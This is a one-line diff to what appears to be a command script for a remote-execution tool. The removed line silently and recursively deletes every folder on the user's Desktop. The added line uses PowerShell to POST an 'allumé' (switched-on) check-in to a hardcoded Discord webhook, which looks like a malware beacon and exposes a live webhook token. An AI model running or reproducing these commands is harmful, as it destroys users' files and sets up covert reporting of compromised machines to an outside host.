@@ -1,1 +1,1 @@
-ExecuteCmd -user -cmd for /d %i in ("%USERPROFILE%\Desktop\*") do rmdir /S /Q "%i"
+ExecuteCmd -user -cmd powershell -Command "Invoke-WebRequest -Uri 'https://discordapp.com/api/webhooks/1483172792739430480/b5t7EcgBP2NMOWm27Wg5xTohXZiSXnekDCS22lv4_4N9zCtynMvNBhL-ganraAyTwnln' -Method POST -Body 'allumé'"
